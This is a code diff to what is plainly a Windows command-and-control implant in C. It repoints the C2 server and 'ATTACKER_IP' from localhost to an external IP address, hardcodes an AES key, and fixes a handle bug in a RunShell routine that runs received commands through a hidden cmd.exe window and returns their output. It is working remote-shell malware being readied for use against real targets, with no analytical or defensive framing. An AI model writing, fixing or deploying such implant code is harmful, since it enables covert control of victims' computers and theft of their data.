@@ -22,7 +22,7 @@
 
 // ── Config ────────────────────────────────────────────────────────────────────
 #ifndef C2_HOST
-#define C2_HOST L"127.0.0.1"
+#define C2_HOST L"65.1.92.74"
 #endif
 #ifndef C2_PORT
 #define C2_PORT 443
@@ -31,7 +31,7 @@
 #define POLL_INTERVAL_MS 30000
 #endif
 #ifndef ATTACKER_IP
-#define ATTACKER_IP "127.0.0.1"
+#define ATTACKER_IP "65.1.92.74"
 #endif
 #ifndef AES_KEY_HEX
 #define AES_KEY_HEX "6a6f636b795f6465765f6165735f6b65795f6a6f636b795f6465765f6165736b"
@@ -348,12 +348,13 @@ static void RunShell(const char* cmd, Sb* out) {
     snprintf(full, sizeof(full), "cmd.exe /C %s", cmd);
 
     PROCESS_INFORMATION pi = {};
-    CloseHandle(hW);
     if (!CreateProcessA(NULL, full, NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi)) {
         CloseHandle(hR);
+        CloseHandle(hW);
         char err[64]; snprintf(err, sizeof(err), "(CreateProcess failed: %lu)", GetLastError());
         sb_appends(out, err); return;
     }
+    CloseHandle(hW);
 
     char tmp[4096]; DWORD nr;
     while (ReadFile(hR, tmp, sizeof(tmp) - 1, &nr, NULL) && nr > 0)
